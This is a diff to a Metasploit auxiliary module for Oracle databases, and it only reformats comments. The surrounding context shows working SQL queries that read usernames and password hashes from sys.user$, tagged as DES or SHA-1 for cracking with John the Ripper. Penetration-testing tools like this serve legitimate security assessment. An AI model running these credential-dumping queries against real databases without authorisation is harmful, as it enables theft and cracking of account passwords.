@@ -28,8 +28,8 @@ class Metasploit3 < Msf::Auxiliary
   def run_host(ip)
     return if not check_dependencies
 
-    #Checks for Version of Oracle, 8g-10g all behave one way, while 11g behaves differently
-    #Also, 11g uses SHA-1 while 8g-10g use DES
+    # Checks for Version of Oracle, 8g-10g all behave one way, while 11g behaves differently
+    # Also, 11g uses SHA-1 while 8g-10g use DES
     is_11g=false
     query =  'select * from v$version'
     ver = prepare_exec(query)
@@ -61,7 +61,7 @@ class Metasploit3 < Msf::Auxiliary
       'Columns' => ['Username', 'Hash']
     )
 
-    #Get the usernames and hashes for 8g-10g
+    # Get the usernames and hashes for 8g-10g
     begin
       if is_11g==false
         query='SELECT name, password FROM sys.user$ where password is not null and name<> \'ANONYMOUS\''
@@ -72,7 +72,7 @@ class Metasploit3 < Msf::Auxiliary
             tbl << row
           end
         end
-      #Get the usernames and hashes for 11g
+      # Get the usernames and hashes for 11g
       else
         query='SELECT name, spare4 FROM sys.user$ where password is not null and name<> \'ANONYMOUS\''
         results= prepare_exec(query)
@@ -97,8 +97,8 @@ class Metasploit3 < Msf::Auxiliary
 
 
   def report_hashes(table, is_11g, ip, service)
-    #reports the hashes slightly differently depending on the version
-    #This is so that we know which are which when we go to crack them
+    # Reports the hashes slightly differently depending on the version
+    # This is so that we know which are which when we go to crack them
     if is_11g==false
       jtr_format = "des"
     else
